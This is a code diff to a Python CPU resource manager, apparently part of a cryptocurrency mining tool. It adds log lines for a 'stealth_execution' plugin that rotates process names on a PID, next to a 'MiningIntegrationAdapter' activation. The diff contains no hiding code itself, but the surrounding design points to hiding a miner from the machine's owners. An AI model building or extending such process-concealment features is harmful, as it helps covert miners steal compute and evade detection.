@@ -1170,10 +1170,20 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 activated_plugins.append(plugin.name)
                 logger.info(f"[TIMESTAMP] [INFO] Kỹ thuật {plugin.name} đã được kích hoạt thành công")
                 logger.debug(f"[TIMESTAMP] [DEBUG] {plugin.name}: Chi tiết cấu hình - PID={pid}, priority={plugin.priority}")
+                
+                # ✅ ENHANCED: Special handling for stealth execution plugin
+                if plugin.name == "stealth_execution":
+                    logger.info(f"🎭 [STEALTH] Process name rotation activated for PID={pid}")
+                    self.logger.info(f"🎭 [CPU Manager] Stealth execution plugin successfully applied to PID={pid}")
+                    
             except Exception as exc:  # noqa: BLE001
                 failed_plugins.append(plugin.name)
                 self.logger.warning(f"[CPU] plug-in {plugin.name} apply() failed: {exc}")
                 logger.error(f"[TIMESTAMP] [ERROR] Kỹ thuật {plugin.name} kích hoạt thất bại: {exc}")
+                
+                # ✅ ENHANCED: Enhanced error logging for stealth plugin failures
+                if plugin.name == "stealth_execution":
+                    self.logger.error(f"❌ [STEALTH] Critical failure: Process name rotation failed for PID={pid}: {exc}")
         
         # ✅ ENHANCED: Full MiningIntegrationAdapter activation with session startup
         try:
